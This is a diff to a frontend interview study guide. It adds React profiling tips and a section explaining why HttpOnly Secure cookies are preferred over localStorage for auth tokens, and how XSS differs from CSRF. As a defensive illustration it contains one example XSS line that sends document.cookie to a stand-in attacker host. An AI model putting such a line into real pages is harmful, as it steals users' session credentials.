@@ -27,6 +27,7 @@
 |  22 | [Observability and Error Monitoring](#22-observability-and-error-monitoring)                |
 |  23 | [CI/CD and Production Safety](#23-ci-cd-and-production-safety)                              |
 |  24 | [Senior-Level Scenario: Slow Production App](#24-senior-level-scenario-slow-production-app) |
+|  25 | [Where to store the auth token](#25-where-to-store-the-auth-token)                          |
 
 ---
 
@@ -92,7 +93,11 @@ A re-render does not automatically mean a DOM update. React first creates the ne
 
 To debug unnecessary renders, I would use:
 
-- React DevTools Profiler.
+- React DevTools Profiler
+  - Go to Profiler in dev tools.
+  - click record and do something on ui.
+  - the compnoent which is getting re-rendered will get hilighted with box.
+  - this will also provide which particular hook, props, state was the cause of the re-render.
 - Component render tracking during development.
 - Inspection of changing props.
 - Checking context providers that update too frequently.
@@ -125,7 +130,7 @@ My process would be:
 3. Use browser Performance tools to identify long tasks.
 4. Analyze bundle size and JavaScript execution.
 5. Check network requests and waterfalls.
-6. Check Core Web Vitals.
+6. Check Core Web Vitals -> Largest Contentful Paint (LCP), Interaction to Next Paint (INP), Cumulative Layout Shift (CLS)
 7. Identify whether the problem is CPU, network, rendering, memory or backend latency.
 
 Possible fixes include:
@@ -1045,6 +1050,438 @@ Then I would isolate the change, fix it, add a regression test or performance bu
 For a severe production regression, I would prioritize restoring service first and root-cause analysis second.
 
 A senior engineer should not spend an hour optimizing code while users are experiencing a production outage if a safe rollback is available.
+
+---
+
+## 25. Where to store the auth token
+
+### Question:
+Where should we store the authentication token?
+
+### Answer:
+
+Use a Secure, HttpOnly cookie for the session/refresh token.
+
+```jsx
+Browser
+   |
+   | HTTPS
+   ↓
+HttpOnly + Secure + SameSite Cookie
+   |
+   ↓
+Backend
+```
+
+Example response from the server:
+The confusing part is that `Set-Cookie` is an HTTP response header, not JavaScript code.
+```http
+Set-Cookie: session=abc123;
+  HttpOnly;
+  Secure;
+  SameSite=Lax;
+  Path=/
+```
+
+Then the browser automatically sends the cookie with requests:
+```http
+GET /api/profile
+Cookie: session=abc123
+```
+
+JavaScript cannot read the HttpOnly cookie:
+```js
+document.cookie // session isn't accessible
+```
+That's valuable because an XSS vulnerability is less likely to directly expose the session token.
+
+What about localStorage?
+
+You can store a token there:
+```js
+localStorage.setItem("token", token);
+```
+but it is generally a worse choice for sensitive authentication credentials because JavaScript can read it. If an attacker achieves XSS, they may be able to extract the token.
+
+So I would generally rank the approaches:
+
+| Storage                      | Recommendation                                   |
+| ---------------------------- | ------------------------------------------------ |
+| **HttpOnly + Secure cookie** | ✅ Preferred for session/refresh credentials      |
+| `localStorage`               | ⚠️ Avoid for sensitive auth tokens when possible |
+| `sessionStorage`             | ⚠️ Same XSS concern                              |
+| Plain JS variable            | ⚠️ Not persistent; still accessible to JS        |
+| URL/query parameter          | ❌ Never for auth tokens                          |
+
+
+### Question:
+What about access tokens?
+
+### Answer:
+
+A common architecture is:
+```jsx
+Login
+  ↓
+Backend creates session/refresh credential
+  ↓
+HttpOnly Secure cookie
+  ↓
+Frontend calls API
+  ↓
+Backend authenticates request
+```
+
+If your architecture specifically uses short-lived access tokens, another pattern is to keep the access token in memory and use an HttpOnly cookie for the refresh/session mechanism:
+```jsx
+HttpOnly cookie
+     ↓
+Refresh/session credential
+
+Memory
+     ↓
+Short-lived access token
+```
+
+The exact choice depends on your authentication architecture, CSRF protections, API design, and whether you're using same-origin or cross-origin requests.
+
+
+### Senior interview answer
+
+> "I would generally avoid putting long-lived authentication credentials in localStorage because JavaScript can access them during an XSS attack. For a browser application, I'd prefer a Secure, HttpOnly, appropriately SameSite cookie for the session or refresh credential. If using access tokens, I may keep short-lived access tokens in memory and use the HttpOnly cookie to obtain new ones. The backend must still enforce authentication and authorization."
+
+### Question:
+What is `Set-Cookie`?
+
+### Answer:
+Let's go step by step.
+
+### 1. User logs in
+
+Your frontend sends:
+
+```http
+POST /login
+email: alice@gmail.com
+password: ******
+```
+
+The backend verifies the credentials.
+
+If they're correct, the backend creates a session/token:
+
+```text
+session = abc123
+```
+
+### 2. Backend sends it to the browser
+
+The backend responds with:
+
+```http
+Set-Cookie: session=abc123;
+  HttpOnly;
+  Secure;
+  SameSite=Lax;
+  Path=/
+```
+
+Think of `Set-Cookie` as the server saying:
+
+> **"Browser, please save this value as a cookie."**
+
+The browser does that automatically.
+
+You don't need:
+
+```js
+localStorage.setItem(...)
+```
+
+and you don't need:
+
+```js
+document.cookie = ...
+```
+
+### 3. What does `HttpOnly` mean?
+
+This is the important part.
+
+```text
+HttpOnly
+```
+
+means:
+
+> **JavaScript is not allowed to read this cookie.**
+
+So this won't give you the session:
+
+```js
+document.cookie
+```
+
+But the **browser itself can still send the cookie to your backend**.
+
+That's the key idea.
+
+### 4. User makes another API request
+
+Your React code does:
+
+```js
+fetch("/api/profile");
+```
+
+The browser automatically attaches the cookie:
+
+```http
+GET /api/profile
+Cookie: session=abc123
+```
+
+Your backend receives:
+
+```text
+session = abc123
+```
+
+and says:
+
+> "I know this session. This request belongs to Alice."
+
+So your React application doesn't actually need to know the token.
+
+### Think of it like a hotel key 🔑
+
+```text
+Login
+  ↓
+Server gives browser a key
+  ↓
+Browser stores key
+  ↓
+Browser automatically shows key to server
+  ↓
+Server knows who you are
+```
+
+React doesn't need to carry the key around.
+
+---
+
+### What do the other options mean?
+
+**Secure**
+
+```text
+Secure
+```
+
+means the cookie should only be sent over HTTPS.
+
+**SameSite=Lax**
+
+```text
+SameSite=Lax
+```
+
+helps restrict when the browser sends the cookie in cross-site situations, which is useful for reducing CSRF risk.
+
+**Path=/**
+
+```text
+Path=/
+```
+
+means the cookie applies to requests under the site's root path.
+
+---
+
+### The big difference
+
+**localStorage approach:**
+
+```text
+Login
+  ↓
+Backend gives token
+  ↓
+React receives token
+  ↓
+localStorage stores token
+  ↓
+React reads token
+  ↓
+React sends token
+```
+
+**HttpOnly cookie approach:**
+
+```text
+Login
+  ↓
+Backend sets cookie
+  ↓
+Browser stores cookie
+  ↓
+Browser automatically sends cookie
+  ↓
+Backend identifies user
+```
+
+That's why **HttpOnly cookies are generally preferred for browser authentication credentials**.
+
+A common senior frontend interview follow-up is:
+
+> **Why does `HttpOnly` help against XSS, but not completely solve CSRF?**
+
+The easiest way to understand it is:
+
+> **HttpOnly protects the cookie from being read by JavaScript. It does not stop the browser from sending the cookie.**
+
+That's why it helps with **XSS**, but doesn't completely solve **CSRF**.
+
+### 1. How HttpOnly helps against XSS
+
+Suppose your authentication cookie is:
+
+```http
+Set-Cookie: session=abc123; HttpOnly; Secure
+```
+
+An attacker manages to inject JavaScript into your application:
+
+```js
+fetch("https://attacker.com/steal?token=" + document.cookie);
+```
+
+Because the cookie is `HttpOnly`:
+
+```js
+document.cookie
+```
+
+cannot access:
+
+```text
+session=abc123
+```
+
+So the attacker can't simply read and steal the session cookie.
+
+```text
+XSS
+ ↓
+Malicious JavaScript
+ ↓
+document.cookie
+ ↓
+❌ HttpOnly cookie is inaccessible
+```
+
+That's the XSS protection benefit.
+
+### 2. But here's the CSRF problem
+
+Remember:
+
+> **The browser automatically sends cookies.**
+
+Imagine you're logged into:
+
+```text
+bank.com
+```
+
+Your browser has:
+
+```text
+session=abc123
+```
+
+Now you visit a malicious website:
+
+```text
+evil.com
+```
+
+That page could potentially cause your browser to make a request to:
+
+```text
+bank.com/transfer
+```
+
+The browser may automatically attach your bank's authentication cookie to that request.
+
+The malicious site **doesn't need to read the cookie**.
+
+That's the important distinction.
+
+```text
+CSRF:
+
+evil.com
+   ↓
+causes request to bank.com
+   ↓
+Browser automatically attaches cookie
+   ↓
+bank.com sees authenticated request
+```
+
+The attacker doesn't need:
+
+```js
+document.cookie
+```
+
+So `HttpOnly` doesn't prevent this by itself.
+
+### 3. How do we protect against CSRF?
+
+A common defense is a **CSRF token**.
+
+For example:
+
+```text
+Browser
+   |
+   | session cookie
+   ↓
+Backend
+```
+
+For a state-changing request, the frontend also sends a CSRF token:
+
+```http
+POST /transfer
+Cookie: session=abc123
+X-CSRF-Token: xyz789
+```
+
+The server verifies both.
+
+A malicious site may be able to cause the browser to send the cookie, but it shouldn't know the required CSRF token.
+
+Other important defenses include appropriate **`SameSite` cookie settings**, origin checks, and framework-specific CSRF protections.
+
+### The interview distinction
+
+| Attack   | What attacker wants                                       | HttpOnly helps? |
+| -------- | --------------------------------------------------------- | --------------- |
+| **XSS**  | Read/steal the cookie using JavaScript                    | ✅ Yes           |
+| **CSRF** | Make the victim's browser perform an authenticated action | ❌ Not by itself |
+
+### Senior-level answer
+
+> **"HttpOnly prevents JavaScript from reading the authentication cookie, so it significantly reduces the impact of cookie theft through XSS. However, HttpOnly doesn't stop the browser from automatically attaching the cookie to requests. Therefore, an attacker can potentially trigger authenticated state-changing requests through CSRF without ever reading the cookie. CSRF tokens, appropriate SameSite settings, and origin validation are used as additional defenses."**
+
+That's the key distinction:
+
+**XSS tries to steal/use the credential; CSRF tries to abuse the browser's automatic use of the credential.**
+
 
 ---
 
